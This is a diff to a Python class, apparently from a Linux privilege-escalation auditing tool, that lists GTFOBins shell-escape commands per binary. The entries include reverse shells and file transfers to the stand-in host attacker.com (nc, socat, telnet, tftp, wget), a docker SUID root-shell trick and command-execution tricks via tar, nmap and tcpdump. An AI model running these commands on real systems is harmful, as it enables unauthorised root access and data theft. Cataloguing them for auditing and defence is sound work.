@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+
 class Binaries:
     """
     Binaries that allow to execute commands from it.
@@ -10,50 +11,11 @@ class Binaries:
     http://touhidshaikh.com/blog/?p=790
     """
 
-    # nc, netcat, strace ?
     def __init__(self):
         """
-        List inspired from GTFOBins:
+        List taken from GTFOBins:
         https://gtfobins.github.io/#
         """
-        # self.list = [
-        #     ('apache2', '$ apache2 -f /etc/shadow'),  # Read files
-        #     ('awk', '$ awk \'BEGIN {system("/bin/sh")}\''),
-        #     ('bash', '$ /bin/bash'),
-        #     ('cp', 'overwrite /etc/shadow or /etc/sudoers file'),
-        #     ('dash', '$ /bin/dash'),
-        #     ('docker',
-        #      '$ docker run -v /home/${USER}:/h_docs ubuntu bash -c "cp /bin/bash /h_docs/rootshell && chmod 4777 /h_docs/rootshell;" && ~/rootshell -p'),
-        #     ('ftp', '$ ftp> ! ls'),
-        #     ('find', '$ echo "/bin/sh" > /tmp/run.sh\n$ find . -type d -exec /tmp/run.sh {} \\;'),
-        #     # or find . -type d -exec sh -c id {} \;
-        #     ('git', '$ export PAGER=./runme.sh\n$ git -p help'),
-        #     ('less', '!bash'),
-        #     ('lua', 'os.execute(\'/bin/sh\')'),
-        #     ('man', '!bash '),  # or $ man -P /tmp/runme.sh man
-        #     ('more', '!bash'),
-        #     ('mount', '$ sudo mount -o bind /bin/bash /bin/mount\n$ sudo mount'),
-        #     # could be a false positive => mount: only root can use "--options" option
-        #     ('mv', 'overwrite /etc/shadow or /etc/sudoers file'),
-        #     ('nmap', '$ echo "os.execute(\'/bin/sh\')" > /tmp/script.nse\n$ nmap --script=/tmp/script.nse'),
-        #     ('perl', '$ perl -e \'exec "/bin/sh";\''),
-        #     ('python', '$ python -c \'import os;os.system("/bin/sh")\''),
-        #     ('rbash', '$ /bin/rbash'),
-        #     ('rsync',
-        #      '$ echo "whoami > /tmp/whoami" > /tmp/tmpfile\nsudo rsync  -e \'sh /tmp/tmpfile\' /dev/null 127.0.0.1:/dev/null 2>/dev/null\ncat whoami '),
-        #     ('ruby', '$ ruby -e \'exec "/bin/sh"\''),
-        #     ('sftp', '$ ftp> ! ls'),
-        #     ('sh', '$ /bin/sh'),
-        #     ('tar', '$ tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=sh'),
-        #     # or tar c a.tar -I ./runme.sh a
-        #     ('tcpdump', '$ tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh'),
-        #     # or sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
-        #     ('vi', '$ vi -c \'!sh\''),  # or :!bash or :set shell=/bin/bash:shell or :shell
-        #     ('vim', '$ vim -c \'!sh\''),  # or :!bash or :set shell=/bin/bash:shell or :shell
-        #     ('wget', '$ sudo wget http://127.0.0.1/sudoers -O /etc/sudoers'),
-        #     # Overwrite system file (need a web server)
-        #     ('zip', '$ zip z.zip * -T -TT /tmp/run.sh'),
-        # ]
 
         self.binaries = {
             "ash": "ash",
@@ -62,13 +24,15 @@ class Binaries:
             "bash": "bash",
             "busybox": "busybox sh",
             "cat": "LFILE=file_to_read\ncat \"$LFILE\"\n",
+            "cpulimit": "cpulimit -l 100 -f /bin/sh",
             "crontab": "crontab -e",
             "csh": "csh",
             "curl": "LFILE=/tmp/file_to_read\ncurl file://$LFILE\n",
             "cut": "LFILE=file_to_read\ncut -d \"\" -f1 \"$LFILE\"\n",
             "dash": "dash",
-            "dd": "LFILE=file_to_write\necho \"data\" | dd of=$LFILE\n",
+            "dd": "LFILE=file_to_write\necho \"DATA\" | dd of=$LFILE\n",
             "diff": "LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE\n",
+            "docker": "sudo docker run --rm -v /home/$USER:/h_docs ubuntu \\\n    sh -c 'cp /bin/sh /h_docs/ && chmod +s /h_docs/sh' && ~/sh -p\n",
             "ed": "ed\n!/bin/sh\n",
             "emacs": "emacs -Q -nw --eval '(term \"/bin/sh\")'",
             "env": "env /bin/sh",
@@ -96,10 +60,13 @@ class Binaries:
             "mount": "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n",
             "nano": "COMMAND=id\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nnano -s $TF /etc/hosts\n^T\n",
             "nc": "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n",
+            "nice": "nice /bin/sh",
             "nl": "LFILE=file_to_read\nnl -bn -w1 -s '' $LFILE\n",
+            "nmap": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF\n",
             "node": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n",
             "od": "LFILE=file_to_read\nod -An -c -w9999 \"$LFILE\"\n",
             "perl": "perl -e 'exec \"/bin/sh\";'",
+            "pg": "pg /etc/profile\n!/bin/sh\n",
             "php": "export CMD=\"/bin/sh\"\nphp -r 'system(getenv(\"CMD\"));'\n",
             "pico": "COMMAND=id\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\npico -s $TF /etc/hosts\n^T\n",
             "puppet": "export CMD=\"/usr/bin/id\"\npuppet apply -e \"exec { '$CMD': logoutput => true }\"\n",
@@ -108,12 +75,13 @@ class Binaries:
             "rlwrap": "rlwrap /bin/sh",
             "rpm": "rpm --eval '%{lua:posix.exec(\"/bin/sh\")}'",
             "rpmquery": "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'",
+            "rsync": "rsync -e 'bash -c \"exec 10<&0 11>&1 0<&2 1>&2; sh -i\"' 127.0.0.1:/dev/null",
             "ruby": "ruby -e 'exec \"/bin/sh\"'",
             "scp": "TF=$(mktemp)\nCMD=\"id\"\necho \"$CMD\" > \"$TF\"\nchmod +x \"$TF\"\nscp -S $TF x y:\n",
             "sed": "sed -n \"1e bash -c 'exec 10<&0 11>&1 0<&2 1>&2; /bin/sh -i'\" /etc/hosts",
             "setarch": "setarch $(arch) /bin/sh",
             "sftp": "HOST=user@attacker.com\nsftp $HOST\n!/bin/sh\n",
-            "shuf": "LFILE=file_to_write\nshuf -e data -o \"$LFILE\"\n",
+            "shuf": "LFILE=file_to_write\nshuf -e DATA -o \"$LFILE\"\n",
             "socat": "RHOST=attacker.com\nRPORT=12345\nsudo -E socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane\n",
             "sort": "LFILE=file_to_read\nsort -m \"$LFILE\"\n",
             "sqlite3": "sqlite3 /dev/null '.shell /bin/sh'",
@@ -124,7 +92,8 @@ class Binaries:
             "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
             "taskset": "taskset 1 /bin/sh",
             "tclsh": "tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n",
-            "tee": "LFILE=file_to_write\necho data | ./tee -a \"$LFILE\"\n",
+            "tcpdump": "COMMAND='id > /tmp/output'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF\n",
+            "tee": "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n",
             "telnet": "RHOST=attacker.com\nRPORT=12345\ntelnet $RHOST $RPORT\n^]\n!/bin/sh\n",
             "tftp": "RHOST=attacker.com\nsudo -E tftp $RHOST\nput file_to_send\n",
             "time": "/usr/bin/time /bin/sh",
@@ -134,12 +103,14 @@ class Binaries:
             "uniq": "LFILE=file_to_read\nuniq \"$LFILE\"\n",
             "unshare": "unshare /bin/sh",
             "vi": "vi -c ':!/bin/sh'",
+            "vim": "vim -c ':!/bin/sh'",
             "watch": "watch /usr/bin/id",
             "wget": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nsudo -E wget $URL -O $LFILE\n",
-            "whois": {},
+            "whois": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT > \"$LFILE\"\n",
             "wish": "wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n",
             "xargs": "xargs -a /dev/null /usr/bin/id",
-            "xxd": "LFILE=file_to_write\necho data | xxd | xxd -r - \"$LFILE\"\n",
+            "xxd": "LFILE=file_to_write\necho DATA | xxd | xxd -r - \"$LFILE\"\n",
+            "zip": "TF=$(mktemp -u)\nzip $TF /etc/hosts -T -TT 'sh #'\nrm $TF\n",
             "zsh": "zsh"
         }
 
